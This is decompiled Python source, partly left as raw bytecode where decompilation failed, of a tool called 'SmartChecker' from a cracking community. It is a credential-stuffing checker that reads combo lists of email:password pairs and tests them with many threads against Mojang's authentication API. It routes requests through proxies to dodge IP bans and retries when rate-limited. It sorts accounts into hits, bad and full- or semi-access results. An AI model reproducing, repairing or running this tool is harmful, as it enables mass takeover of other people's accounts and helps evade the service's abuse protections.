# decompyle3 version 3.7.5
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.8.11 (default, Aug 17 2021, 15:56:41) 
# [GCC 10.2.1 20210110]
# Embedded file name: SmartChecker02.py
from ctypes import windll
import multiprocessing.dummy as ThreadPool
from os import mkdir, path, system
from queue import Queue
from random import choice
from threading import Thread
from time import sleep, strftime
from colorama import init, Fore
from requests import get, post
from yaml import full_load
init()
while True:
    try:
        config = full_load(open('config.yml', 'r', errors='ignore'))
        break
    except FileNotFoundError:
        print(f"{Fore.LIGHTRED_EX}Config file not found, i creating new one. Restart Checker.\n")
        open('config.yml', 'w').write("# SmartChecker v0.2 by Patko Cr4cking\n# Subscribe my YT: https://bit.ly/2MGKtHt\n# Join my Discord Server: https://discord.gg/e5hYgp4k2H\nchecker:\n\n  # Rechecks per account. higher = slower, 1+\n  retries: 1\n\n  # Request Timeout \n  timeout: 6000\n\n  # Threads of Checking\n  threads: 600\n\n  # Save Bad Accounts in Bad.txt\n  save_bad: false\n\n  # Print Bad Accounts\n  print_bad: true\n\n  debugging: false\n\n  proxy:\n   # If you dont use proxies your IP get banned\n   proxy: true\n   # Type of proxies: https, socks4, socks5\n   proxy_type: 'https'\n\n\n")
        sleep(3)
        system('cls')
    except Exception as eef:
        try:
            print(f"{Fore.LIGHTRED_EX}Error with {eef}")
            sleep(5)
            exit()
        finally:
            eef = None
            del eef

class Counter:
    nfa = 0
    sfa = 0
    hits = 0
    bad = 0
    cpm = 0


class Main:

    def __init__--- This code section failed: ---

 L.  67         0  LOAD_STR                 'v0.2'
                2  LOAD_FAST                'self'
                4  STORE_ATTR               version

 L.  68         6  LOAD_GLOBAL              windll
                8  LOAD_ATTR                kernel32
               10  LOAD_METHOD              SetConsoleTitleW
               12  LOAD_STR                 'SmartChecker '
               14  LOAD_FAST                'self'
               16  LOAD_ATTR                version
               18  FORMAT_VALUE          0  ''
               20  LOAD_STR                 ' | by patko250705#8211 | Status: Starting...'
               22  BUILD_STRING_3        3 
               24  CALL_METHOD_1         1  ''
               26  POP_TOP          

 L.  69        28  LOAD_GLOBAL              Queue
               30  CALL_FUNCTION_0       0  ''
               32  LOAD_FAST                'self'
               34  STORE_ATTR               printing

 L.  70        36  LOAD_GLOBAL              Queue
               38  CALL_FUNCTION_0       0  ''
               40  LOAD_FAST                'self'
               42  STORE_ATTR               caputer

 L.  71        44  LOAD_GLOBAL              Queue
               46  CALL_FUNCTION_0       0  ''
               48  LOAD_FAST                'self'
               50  STORE_ATTR               hits

 L.  72        52  LOAD_GLOBAL              Queue
               54  CALL_FUNCTION_0       0  ''
               56  LOAD_FAST                'self'
               58  STORE_ATTR               bad

 L.  73        60  LOAD_GLOBAL              Queue
               62  CALL_FUNCTION_0       0  ''
               64  LOAD_FAST                'self'
               66  STORE_ATTR               towrite

 L.  74        68  BUILD_LIST_0          0 
               70  LOAD_FAST                'self'
               72  STORE_ATTR               accounts

 L.  75        74  LOAD_STR                 'https://authserver.mojang.com/authenticate'
               76  LOAD_FAST                'self'
               78  STORE_ATTR               mcurl

 L.  76        80  LOAD_STR                 'https://api.mojang.com/user/security/challenges'
               82  LOAD_FAST                'self'
               84  STORE_ATTR               secureurl

 L.  77        86  LOAD_STR                 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36 OPR/72.0.3815.459'
               88  LOAD_STR                 'no-cache'
               90  LOAD_CONST               ('User-Agent', 'Pragma')
               92  BUILD_CONST_KEY_MAP_2     2 
               94  LOAD_FAST                'self'
               96  STORE_ATTR               maheaders

 L.  78        98  LOAD_GLOBAL              Checker
              100  LOAD_ATTR                threads
              102  LOAD_FAST                'self'
              104  STORE_ATTR               threads

 L.  79       106  LOAD_GLOBAL              Checker
              108  LOAD_ATTR                retries
              110  LOAD_FAST                'self'
              112  STORE_ATTR               retries

 L.  80       114  LOAD_GLOBAL              Checker
              116  LOAD_ATTR                save_bad
              118  LOAD_FAST                'self'
              120  STORE_ATTR               savebad

 L.  81       122  LOAD_GLOBAL              Checker
              124  LOAD_ATTR                print_bad
              126  LOAD_FAST                'self'
              128  STORE_ATTR               printbad

 L.  82       130  LOAD_GLOBAL              Checker
              132  LOAD_ATTR                debug
              134  LOAD_FAST                'self'
              136  STORE_ATTR               debug

 L.  83       138  LOAD_FAST                'self'
              140  LOAD_ATTR                retries
              142  LOAD_CONST               0
              144  COMPARE_OP               ==
              146  POP_JUMP_IF_FALSE   154  'to 154'

 L.  84       148  LOAD_CONST               1
              150  LOAD_FAST                'self'
              152  STORE_ATTR               retries
            154_0  COME_FROM           146  '146'

 L.  85       154  LOAD_FAST                'self'
              156  LOAD_ATTR                threads
              158  LOAD_CONST               0
              160  COMPARE_OP               ==
              162  POP_JUMP_IF_FALSE   170  'to 170'

 L.  86       164  LOAD_CONST               1
              166  LOAD_FAST                'self'
              168  STORE_ATTR               threads
            170_0  COME_FROM           162  '162'

 L.  87       170  LOAD_STR                 'proxies.txt'
              172  LOAD_FAST                'self'
              174  STORE_ATTR               proxylist

 L.  88       176  LOAD_GLOBAL              Checker
              178  LOAD_ATTR                Proxy
              180  LOAD_ATTR                type
              182  LOAD_FAST                'self'
              184  STORE_ATTR               proxy_type

 L.  89       186  LOAD_CONST               True
              188  LOAD_FAST                'self'
              190  STORE_ATTR               stop

 L.  90       192  LOAD_STR                 '\n\n        ██████  ███▄ ▄███▓ ▄▄▄       ██▀███  ▄▄▄█████▓ ▄████▄   ██░ ██ ▓█████  ▄████▄   ██ ▄█▀▓█████  ██▀███  \n      ▒██    ▒ ▓██▒▀█▀ ██▒▒████▄    ▓██ ▒ ██▒▓  ██▒ ▓▒▒██▀ ▀█  ▓██░ ██▒▓█   ▀ ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒\n      ░ ▓██▄   ▓██    ▓██░▒██  ▀█▄  ▓██ ░▄█ ▒▒ ▓██░ ▒░▒▓█    ▄ ▒██▀▀██░▒███   ▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒\n        ▒   ██▒▒██    ▒██ ░██▄▄▄▄██ ▒██▀▀█▄  ░ ▓██▓ ░ ▒▓▓▄ ▄██▒░▓█ ░██ ▒▓█  ▄ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  \n      ▒██████▒▒▒██▒   ░██▒ ▓█   ▓██▒░██▓ ▒██▒  ▒██▒ ░ ▒ ▓███▀ ░░▓█▒░██▓░▒████▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒\n      ▒ ▒▓▒ ▒ ░░ ▒░   ░  ░ ▒▒   ▓▒█░░ ▒▓ ░▒▓░  ▒ ░░   ░ ░▒ ▒  ░ ▒ ░░▒░▒░░ ▒░ ░░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░\n      ░ ░▒  ░ ░░  ░      ░  ▒   ▒▒ ░  ░▒ ░ ▒░    ░      ░  ▒    ▒ ░▒░ ░ ░ ░  ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░\n      ░  ░  ░  ░      ░     ░   ▒     ░░   ░   ░      ░         ░  ░░ ░   ░   ░        ░ ░░ ░    ░     ░░   ░ \n            ░         ░         ░  ░   ░              ░ ░       ░  ░  ░   ░  ░░ ░      ░  ░      ░  ░   ░     \n                                                      ░                       ░                                                                                                 \n\n'
              194  LOAD_FAST                'self'
              196  STORE_ATTR               t

 L. 103       198  LOAD_GLOBAL              print
              200  LOAD_GLOBAL              Fore
              202  LOAD_ATTR                LIGHTGREEN_EX
              204  LOAD_FAST                'self'
              206  LOAD_ATTR                t
              208  BINARY_ADD       
              210  CALL_FUNCTION_1       1  ''
              212  POP_TOP          

 L. 105       214  LOAD_CODE                <code_object print_slow>
              216  LOAD_STR                 'Main.__init__.<locals>.print_slow'
              218  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
              220  STORE_FAST               'print_slow'

 L. 111       222  LOAD_FAST                'print_slow'
              224  LOAD_STR                 'Starting SmartChecker... '
              226  CALL_FUNCTION_1       1  ''
              228  POP_TOP          

 L. 112       230  LOAD_GLOBAL              sum
              232  LOAD_GENEXPR             '<code_object <genexpr>>'
              234  LOAD_STR                 'Main.__init__.<locals>.<genexpr>'
              236  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
              238  LOAD_GLOBAL              open
              240  LOAD_STR                 'combo.txt'
              242  CALL_FUNCTION_1       1  ''
              244  GET_ITER         
              246  CALL_FUNCTION_1       1  ''
              248  CALL_FUNCTION_1       1  ''
              250  STORE_FAST               'combo_lines'

 L. 113       252  LOAD_GLOBAL              sum
              254  LOAD_GENEXPR             '<code_object <genexpr>>'
              256  LOAD_STR                 'Main.__init__.<locals>.<genexpr>'
              258  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
              260  LOAD_GLOBAL              open
              262  LOAD_STR                 'proxies.txt'
              264  CALL_FUNCTION_1       1  ''
              266  GET_ITER         
              268  CALL_FUNCTION_1       1  ''
              270  CALL_FUNCTION_1       1  ''
              272  STORE_FAST               'proxy_lines'

 L. 114       274  LOAD_GLOBAL              print
              276  CALL_FUNCTION_0       0  ''
              278  POP_TOP          

 L. 115       280  LOAD_GLOBAL              print
              282  LOAD_GLOBAL              Fore
              284  LOAD_ATTR                LIGHTCYAN_EX
              286  FORMAT_VALUE          0  ''
              288  LOAD_STR                 '['
              290  LOAD_GLOBAL              Fore
              292  LOAD_ATTR                LIGHTGREEN_EX
              294  FORMAT_VALUE          0  ''
              296  LOAD_STR                 '+'
              298  LOAD_GLOBAL              Fore
              300  LOAD_ATTR                LIGHTCYAN_EX
              302  FORMAT_VALUE          0  ''
              304  LOAD_STR                 ']'
              306  LOAD_GLOBAL              Fore
              308  LOAD_ATTR                LIGHTGREEN_EX
              310  FORMAT_VALUE          0  ''
              312  LOAD_STR                 ' Imported Combo: '
              314  LOAD_GLOBAL              Fore
              316  LOAD_ATTR                LIGHTRED_EX
              318  FORMAT_VALUE          0  ''
              320  LOAD_FAST                'combo_lines'
              322  FORMAT_VALUE          0  ''
              324  BUILD_STRING_10      10 
              326  CALL_FUNCTION_1       1  ''
              328  POP_TOP          

 L. 116       330  LOAD_GLOBAL              print
              332  LOAD_GLOBAL              Fore
              334  LOAD_ATTR                LIGHTCYAN_EX
              336  FORMAT_VALUE          0  ''
              338  LOAD_STR                 '['
              340  LOAD_GLOBAL              Fore
              342  LOAD_ATTR                LIGHTGREEN_EX
              344  FORMAT_VALUE          0  ''
              346  LOAD_STR                 '+'
              348  LOAD_GLOBAL              Fore
              350  LOAD_ATTR                LIGHTCYAN_EX
              352  FORMAT_VALUE          0  ''
              354  LOAD_STR                 ']'
              356  LOAD_GLOBAL              Fore
              358  LOAD_ATTR                LIGHTGREEN_EX
              360  FORMAT_VALUE          0  ''
              362  LOAD_STR                 ' Imported Proxies: '
              364  LOAD_GLOBAL              Fore
              366  LOAD_ATTR                LIGHTRED_EX
              368  FORMAT_VALUE          0  ''
              370  LOAD_FAST                'proxy_lines'
              372  FORMAT_VALUE          0  ''
              374  BUILD_STRING_10      10 
              376  CALL_FUNCTION_1       1  ''
              378  POP_TOP          

 L. 117       380  SETUP_FINALLY       414  'to 414'

 L. 118       382  LOAD_GLOBAL              open
              384  LOAD_FAST                'self'
              386  LOAD_ATTR                proxylist
              388  LOAD_STR                 'r'
              390  LOAD_STR                 'u8'
              392  LOAD_STR                 'ignore'
              394  LOAD_CONST               ('encoding', 'errors')
              396  CALL_FUNCTION_KW_4     4  '4 total positional and keyword args'
              398  LOAD_METHOD              read
              400  CALL_METHOD_0         0  ''
              402  LOAD_METHOD              split
              404  CALL_METHOD_0         0  ''
              406  LOAD_FAST                'self'
              408  STORE_ATTR               proxys
              410  POP_BLOCK        
              412  JUMP_FORWARD        480  'to 480'
            414_0  COME_FROM_FINALLY   380  '380'

 L. 119       414  DUP_TOP          
              416  LOAD_GLOBAL              FileNotFoundError
              418  COMPARE_OP               exception-match
          420_422  POP_JUMP_IF_FALSE   478  'to 478'
              424  POP_TOP          
              426  POP_TOP          
              428  POP_TOP          

 L. 120       430  LOAD_GLOBAL              print
              432  LOAD_GLOBAL              Fore
              434  LOAD_ATTR                LIGHTRED_EX
              436  FORMAT_VALUE          0  ''
              438  LOAD_FAST                'self'
              440  LOAD_ATTR                proxylist
              442  FORMAT_VALUE          0  ''
              444  LOAD_STR                 ' not found, Please make sure '
              446  LOAD_FAST                'self'
              448  LOAD_ATTR                proxylist
              450  FORMAT_VALUE          0  ''
              452  LOAD_STR                 ' is in folder'
              454  BUILD_STRING_5        5 
              456  CALL_FUNCTION_1       1  ''
              458  POP_TOP          

 L. 121       460  LOAD_GLOBAL              input
              462  LOAD_STR                 'Please create proxies.txt file'
              464  CALL_FUNCTION_1       1  ''
              466  POP_TOP          

 L. 122       468  LOAD_GLOBAL              exit
              470  CALL_FUNCTION_0       0  ''
              472  POP_TOP          
              474  POP_EXCEPT       
              476  JUMP_FORWARD        480  'to 480'
            478_0  COME_FROM           420  '420'
              478  END_FINALLY      
            480_0  COME_FROM           586  '586'
            480_1  COME_FROM           582  '582'
            480_2  COME_FROM           576  '576'
            480_3  COME_FROM           532  '532'
            480_4  COME_FROM           476  '476'
            480_5  COME_FROM           412  '412'

 L. 124       480  LOAD_GLOBAL              print
              482  LOAD_GLOBAL              Fore
              484  LOAD_ATTR                LIGHTRED_EX
              486  CALL_FUNCTION_1       1  ''
              488  POP_TOP          

 L. 125       490  LOAD_STR                 'combo.txt'
              492  STORE_FAST               'file'

 L. 126       494  SETUP_FINALLY       534  'to 534'

 L. 127       496  LOAD_GLOBAL              open
              498  LOAD_FAST                'file'
              500  LOAD_STR                 'r'
              502  LOAD_STR                 'u8'
              504  LOAD_STR                 'ignore'
              506  LOAD_CONST               ('encoding', 'errors')
              508  CALL_FUNCTION_KW_4     4  '4 total positional and keyword args'
              510  LOAD_METHOD              read
              512  CALL_METHOD_0         0  ''
              514  LOAD_METHOD              split
              516  LOAD_STR                 '\n'
              518  CALL_METHOD_1         1  ''
              520  LOAD_FAST                'self'
              522  STORE_ATTR               combolist

 L. 128       524  POP_BLOCK        
          526_528  BREAK_LOOP          590  'to 590'
              530  POP_BLOCK        
              532  JUMP_BACK           480  'to 480'
            534_0  COME_FROM_FINALLY   494  '494'

 L. 129       534  DUP_TOP          
              536  LOAD_GLOBAL              FileNotFoundError
              538  COMPARE_OP               exception-match
          540_542  POP_JUMP_IF_FALSE   584  'to 584'
              544  POP_TOP          
              546  POP_TOP          
              548  POP_TOP          

 L. 130       550  LOAD_GLOBAL              print
              552  LOAD_STR                 '\n'
              554  LOAD_GLOBAL              Fore
              556  LOAD_ATTR                LIGHTRED_EX
              558  FORMAT_VALUE          0  ''
              560  LOAD_STR                 'I dont find file, please try again.'
              562  LOAD_GLOBAL              Fore
              564  LOAD_ATTR                LIGHTBLUE_EX
              566  FORMAT_VALUE          0  ''
              568  BUILD_STRING_4        4 
              570  CALL_FUNCTION_1       1  ''
              572  POP_TOP          

 L. 131       574  POP_EXCEPT       
          576_578  JUMP_BACK           480  'to 480'
              580  POP_EXCEPT       
              582  JUMP_BACK           480  'to 480'
            584_0  COME_FROM           540  '540'
              584  END_FINALLY      
          586_588  JUMP_BACK           480  'to 480'
            590_0  COME_FROM           526  '526'

 L. 132       590  LOAD_GLOBAL              print
              592  LOAD_GLOBAL              Fore
              594  LOAD_ATTR                LIGHTCYAN_EX
              596  CALL_FUNCTION_1       1  ''
              598  POP_TOP          

 L. 133       600  LOAD_GLOBAL              open
              602  LOAD_STR                 'dictionary.txt'
              604  LOAD_STR                 'a+'
              606  CALL_FUNCTION_2       2  ''
              608  LOAD_METHOD              read
              610  CALL_METHOD_0         0  ''
              612  LOAD_FAST                'self'
              614  STORE_ATTR               dictorary

 L. 134       616  LOAD_GLOBAL              str
              618  LOAD_GLOBAL              strftime
              620  LOAD_STR                 'Results (%d-%m-%Y %H-%M-%S)'
              622  CALL_FUNCTION_1       1  ''
              624  CALL_FUNCTION_1       1  ''
              626  STORE_FAST               'unix'

 L. 135       628  LOAD_STR                 'results/'
              630  LOAD_FAST                'unix'
              632  FORMAT_VALUE          0  ''
              634  BUILD_STRING_2        2 
              636  LOAD_FAST                'self'
              638  STORE_ATTR               folder

 L. 136       640  LOAD_GLOBAL              path
              642  LOAD_METHOD              exists
              644  LOAD_STR                 'results'
              646  CALL_METHOD_1         1  ''
          648_650  POP_JUMP_IF_TRUE    660  'to 660'

 L. 137       652  LOAD_GLOBAL              mkdir
              654  LOAD_STR                 'results'
              656  CALL_FUNCTION_1       1  ''
              658  POP_TOP          
            660_0  COME_FROM           648  '648'

 L. 138       660  LOAD_GLOBAL              path
              662  LOAD_METHOD              exists
              664  LOAD_FAST                'self'
              666  LOAD_ATTR                folder
              668  CALL_METHOD_1         1  ''
          670_672  POP_JUMP_IF_TRUE    684  'to 684'

 L. 139       674  LOAD_GLOBAL              mkdir
              676  LOAD_FAST                'self'
              678  LOAD_ATTR                folder
              680  CALL_FUNCTION_1       1  ''
              682  POP_TOP          
            684_0  COME_FROM           670  '670'

 L. 140       684  LOAD_FAST                'self'
              686  LOAD_ATTR                combolist
              688  GET_ITER         
            690_0  COME_FROM           706  '706'
              690  FOR_ITER            710  'to 710'
              692  STORE_FAST               'x'

 L. 141       694  LOAD_FAST                'self'
              696  LOAD_ATTR                accounts
              698  LOAD_METHOD              append
              700  LOAD_FAST                'x'
              702  CALL_METHOD_1         1  ''
              704  POP_TOP          
          706_708  JUMP_BACK           690  'to 690'
            710_0  COME_FROM           690  '690'

 L. 142       710  LOAD_GLOBAL              Thread
              712  LOAD_FAST                'self'
              714  LOAD_ATTR                prints
              716  LOAD_CONST               ('target',)
              718  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              720  STORE_FAST               't1'

 L. 143       722  LOAD_CONST               True
              724  LOAD_FAST                't1'
              726  STORE_ATTR               daemon

 L. 144       728  LOAD_FAST                't1'
              730  LOAD_METHOD              start
              732  CALL_METHOD_0         0  ''
              734  POP_TOP          

 L. 145       736  LOAD_GLOBAL              Thread
              738  LOAD_FAST                'self'
              740  LOAD_ATTR                writing
              742  LOAD_CONST               ('target',)
              744  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              746  LOAD_METHOD              start
              748  CALL_METHOD_0         0  ''
              750  POP_TOP          

 L. 146       752  LOAD_GLOBAL              Thread
              754  LOAD_FAST                'self'
              756  LOAD_ATTR                save_hits
              758  LOAD_CONST               ('target',)
              760  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              762  LOAD_METHOD              start
              764  CALL_METHOD_0         0  ''
              766  POP_TOP          

 L. 147       768  LOAD_GLOBAL              Thread
              770  LOAD_FAST                'self'
              772  LOAD_ATTR                cpm
              774  LOAD_CONST               True
              776  LOAD_CONST               ('target', 'daemon')
              778  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              780  LOAD_METHOD              start
              782  CALL_METHOD_0         0  ''
              784  POP_TOP          

 L. 148       786  LOAD_GLOBAL              Thread
              788  LOAD_FAST                'self'
              790  LOAD_ATTR                tite
              792  LOAD_CONST               ('target',)
              794  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              796  STORE_FAST               't2'

 L. 149       798  LOAD_CONST               True
              800  LOAD_FAST                't2'
              802  STORE_ATTR               daemon

 L. 150       804  LOAD_FAST                'self'
              806  LOAD_ATTR                savebad
          808_810  POP_JUMP_IF_FALSE   828  'to 828'

 L. 151       812  LOAD_GLOBAL              Thread
              814  LOAD_FAST                'self'
              816  LOAD_ATTR                save_bad
              818  LOAD_CONST               ('target',)
              820  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              822  LOAD_METHOD              start
              824  CALL_METHOD_0         0  ''
              826  POP_TOP          
            828_0  COME_FROM           808  '808'

 L. 152       828  LOAD_GLOBAL              ThreadPool
              830  LOAD_GLOBAL              Checker
              832  LOAD_ATTR                threads
              834  CALL_FUNCTION_1       1  ''
              836  STORE_FAST               'pool'

 L. 153       838  LOAD_GLOBAL              system
              840  LOAD_STR                 'cls'
              842  CALL_FUNCTION_1       1  ''
              844  POP_TOP          

 L. 154       846  LOAD_FAST                't2'
              848  LOAD_METHOD              start
              850  CALL_METHOD_0         0  ''
              852  POP_TOP          

 L. 155       854  LOAD_GLOBAL              print
              856  LOAD_GLOBAL              Fore
              858  LOAD_ATTR                LIGHTGREEN_EX
              860  LOAD_FAST                'self'
              862  LOAD_ATTR                t
              864  BINARY_ADD       
              866  LOAD_GLOBAL              Fore
              868  LOAD_ATTR                WHITE
              870  BINARY_ADD       
              872  CALL_FUNCTION_1       1  ''
              874  POP_TOP          

 L. 156       876  LOAD_FAST                'pool'
              878  LOAD_METHOD              map
              880  LOAD_FAST                'self'
              882  LOAD_ATTR                prep
              884  LOAD_FAST                'self'
              886  LOAD_ATTR                accounts
              888  CALL_METHOD_2         2  ''
              890  POP_TOP          

 L. 157       892  LOAD_FAST                'pool'
              894  LOAD_METHOD              close
              896  CALL_METHOD_0         0  ''
              898  POP_TOP          

 L. 158       900  LOAD_FAST                'pool'
              902  LOAD_METHOD              join
              904  CALL_METHOD_0         0  ''
              906  POP_TOP          
            908_0  COME_FROM          1086  '1086'
            908_1  COME_FROM           992  '992'
            908_2  COME_FROM           976  '976'
            908_3  COME_FROM           960  '960'
            908_4  COME_FROM           944  '944'
            908_5  COME_FROM           928  '928'

 L. 160       908  LOAD_GLOBAL              sleep
              910  LOAD_CONST               0.01
              912  CALL_FUNCTION_1       1  ''
              914  POP_TOP          

 L. 161       916  LOAD_FAST                'self'
              918  LOAD_ATTR                printing
              920  LOAD_METHOD              qsize
              922  CALL_METHOD_0         0  ''
              924  LOAD_CONST               0
              926  COMPARE_OP               ==
          928_930  POP_JUMP_IF_FALSE_BACK   908  'to 908'
              932  LOAD_FAST                'self'
              934  LOAD_ATTR                towrite
              936  LOAD_METHOD              qsize
              938  CALL_METHOD_0         0  ''
              940  LOAD_CONST               0
              942  COMPARE_OP               ==
          944_946  POP_JUMP_IF_FALSE_BACK   908  'to 908'
              948  LOAD_FAST                'self'
              950  LOAD_ATTR                caputer
              952  LOAD_METHOD              qsize
              954  CALL_METHOD_0         0  ''
              956  LOAD_CONST               0
              958  COMPARE_OP               ==
          960_962  POP_JUMP_IF_FALSE_BACK   908  'to 908'
              964  LOAD_FAST                'self'
              966  LOAD_ATTR                bad
              968  LOAD_METHOD              qsize
              970  CALL_METHOD_0         0  ''
              972  LOAD_CONST               0
              974  COMPARE_OP               ==
          976_978  POP_JUMP_IF_FALSE_BACK   908  'to 908'
              980  LOAD_FAST                'self'
              982  LOAD_ATTR                hits
              984  LOAD_METHOD              qsize
              986  CALL_METHOD_0         0  ''
              988  LOAD_CONST               0
              990  COMPARE_OP               ==
          992_994  POP_JUMP_IF_FALSE_BACK   908  'to 908'

 L. 162       996  LOAD_GLOBAL              sleep
              998  LOAD_CONST               4
             1000  CALL_FUNCTION_1       1  ''
             1002  POP_TOP          

 L. 163      1004  LOAD_GLOBAL              print
             1006  LOAD_GLOBAL              Fore
             1008  LOAD_ATTR                LIGHTMAGENTA_EX
             1010  FORMAT_VALUE          0  ''
             1012  LOAD_STR                 '\n\nResults: \nHits: '
             1014  LOAD_GLOBAL              Counter
             1016  LOAD_ATTR                hits
             1018  FORMAT_VALUE          0  ''
             1020  LOAD_STR                 '\nBad: '
             1022  LOAD_GLOBAL              Counter
             1024  LOAD_ATTR                bad
             1026  FORMAT_VALUE          0  ''
             1028  LOAD_STR                 '\nNFA: '
             1030  LOAD_GLOBAL              Counter
             1032  LOAD_ATTR                nfa
             1034  FORMAT_VALUE          0  ''
             1036  LOAD_STR                 '\nSFA: '
             1038  LOAD_GLOBAL              Counter
             1040  LOAD_ATTR                sfa
             1042  FORMAT_VALUE          0  ''
             1044  LOAD_STR                 '\n'
             1046  LOAD_GLOBAL              Fore
             1048  LOAD_ATTR                LIGHTMAGENTA_EX
             1050  FORMAT_VALUE          0  ''
             1052  LOAD_STR                 '\nFinished\n'
             1054  LOAD_GLOBAL              Fore
             1056  LOAD_ATTR                LIGHTRED_EX
             1058  FORMAT_VALUE          0  ''
             1060  BUILD_STRING_13      13 
             1062  CALL_FUNCTION_1       1  ''
             1064  POP_TOP          

 L. 169      1066  LOAD_GLOBAL              print
             1068  LOAD_STR                 'Close program'
             1070  LOAD_GLOBAL              Fore
             1072  LOAD_ATTR                WHITE
             1074  FORMAT_VALUE          0  ''
             1076  BUILD_STRING_2        2 
             1078  CALL_FUNCTION_1       1  ''
             1080  POP_TOP          

 L. 170  1082_1084  JUMP_FORWARD       1090  'to 1090'
         1086_1088  JUMP_BACK           908  'to 908'
           1090_0  COME_FROM          1082  '1082'

Parse error at or near `JUMP_BACK' instruction at offset 582

    def prep--- This code section failed: ---

 L. 173       0_2  SETUP_FINALLY       588  'to 588'

 L. 174         4  LOAD_FAST                'line'
                6  LOAD_METHOD              split
                8  LOAD_STR                 ':'
               10  LOAD_CONST               1
               12  CALL_METHOD_2         2  ''
               14  UNPACK_SEQUENCE_2     2 
               16  STORE_FAST               'email'
               18  STORE_FAST               'password'

 L. 175        20  LOAD_CONST               0
               22  STORE_FAST               'check_counter'

 L. 176        24  LOAD_STR                 'errorMessage'
               26  LOAD_STR                 'Invalid credentials'
               28  BUILD_MAP_1           1 
               30  STORE_FAST               'answer'
             32_0  COME_FROM           122  '122'
             32_1  COME_FROM           118  '118'

 L. 178        32  LOAD_FAST                'check_counter'
               34  LOAD_FAST                'self'
               36  LOAD_ATTR                retries
               38  COMPARE_OP               !=
               40  POP_JUMP_IF_FALSE   124  'to 124'

 L. 179        42  LOAD_FAST                'self'
               44  LOAD_METHOD              checkmc
               46  LOAD_FAST                'email'
               48  LOAD_FAST                'password'
               50  CALL_METHOD_2         2  ''
               52  STORE_FAST               'answer'

 L. 180        54  LOAD_GLOBAL              str
               56  LOAD_FAST                'answer'
               58  CALL_FUNCTION_1       1  ''
               60  LOAD_METHOD              __contains__
               62  LOAD_STR                 'Invalid credentials'
               64  CALL_METHOD_1         1  ''
               66  POP_JUMP_IF_FALSE    78  'to 78'

 L. 181        68  LOAD_FAST                'check_counter'
               70  LOAD_CONST               1
               72  INPLACE_ADD      
               74  STORE_FAST               'check_counter'
               76  JUMP_FORWARD        122  'to 122'
             78_0  COME_FROM            66  '66'

 L. 182        78  LOAD_GLOBAL              str
               80  LOAD_FAST                'answer'
               82  CALL_FUNCTION_1       1  ''
               84  LOAD_METHOD              __contains__
               86  LOAD_STR                 'Request blocked.'
               88  CALL_METHOD_1         1  ''
               90  POP_JUMP_IF_TRUE    106  'to 106'
               92  LOAD_GLOBAL              str
               94  LOAD_FAST                'answer'
               96  CALL_FUNCTION_1       1  ''
               98  LOAD_METHOD              __contains__

 L. 183       100  LOAD_STR                 "'Client sent too many requests too fast.'"

 L. 182       102  CALL_METHOD_1         1  ''
              104  POP_JUMP_IF_FALSE   124  'to 124'
            106_0  COME_FROM            90  '90'

 L. 184       106  LOAD_GLOBAL              sleep
              108  LOAD_CONST               0.1
              110  CALL_FUNCTION_1       1  ''
              112  POP_TOP          
              114  JUMP_FORWARD        122  'to 122'

 L. 186       116  JUMP_FORWARD        124  'to 124'
              118  JUMP_BACK            32  'to 32'

 L. 188       120  JUMP_FORWARD        124  'to 124'
            122_0  COME_FROM           114  '114'
            122_1  COME_FROM            76  '76'
              122  JUMP_BACK            32  'to 32'
            124_0  COME_FROM           120  '120'
            124_1  COME_FROM           116  '116'
            124_2  COME_FROM           104  '104'
            124_3  COME_FROM            40  '40'

 L. 189       124  LOAD_GLOBAL              str
              126  LOAD_FAST                'answer'
              128  CALL_FUNCTION_1       1  ''
              130  LOAD_METHOD              __contains__
              132  LOAD_STR                 'errorMessage'
              134  CALL_METHOD_1         1  ''
              136  POP_JUMP_IF_FALSE   210  'to 210'

 L. 190       138  LOAD_GLOBAL              Counter
              140  DUP_TOP          
              142  LOAD_ATTR                bad
              144  LOAD_CONST               1
              146  INPLACE_ADD      
              148  ROT_TWO          
              150  STORE_ATTR               bad

 L. 191       152  LOAD_FAST                'self'
              154  LOAD_ATTR                printbad
              156  POP_JUMP_IF_FALSE   188  'to 188'

 L. 192       158  LOAD_FAST                'self'
              160  LOAD_ATTR                printing
              162  LOAD_METHOD              put
              164  LOAD_GLOBAL              Fore
              166  LOAD_ATTR                LIGHTRED_EX
              168  LOAD_STR                 '[BAD] '
              170  LOAD_FAST                'line'
              172  FORMAT_VALUE          0  ''
              174  BUILD_STRING_2        2 
              176  BINARY_ADD       
              178  LOAD_GLOBAL              Fore
              180  LOAD_ATTR                WHITE
              182  BINARY_ADD       
              184  CALL_METHOD_1         1  ''
              186  POP_TOP          
            188_0  COME_FROM           156  '156'

 L. 193       188  LOAD_FAST                'self'
              190  LOAD_ATTR                savebad
              192  POP_JUMP_IF_FALSE   206  'to 206'

 L. 194       194  LOAD_FAST                'self'
              196  LOAD_ATTR                bad
              198  LOAD_METHOD              put
              200  LOAD_FAST                'line'
              202  CALL_METHOD_1         1  ''
              204  POP_TOP          
            206_0  COME_FROM           192  '192'
          206_208  JUMP_FORWARD        584  'to 584'
            210_0  COME_FROM           136  '136'

 L. 196       210  LOAD_FAST                'answer'
              212  LOAD_STR                 'availableProfiles'
              214  BINARY_SUBSCR    
              216  LOAD_CONST               0
              218  BINARY_SUBSCR    
              220  LOAD_STR                 'id'
              222  BINARY_SUBSCR    
              224  STORE_FAST               'uuid'

 L. 197       226  LOAD_FAST                'answer'
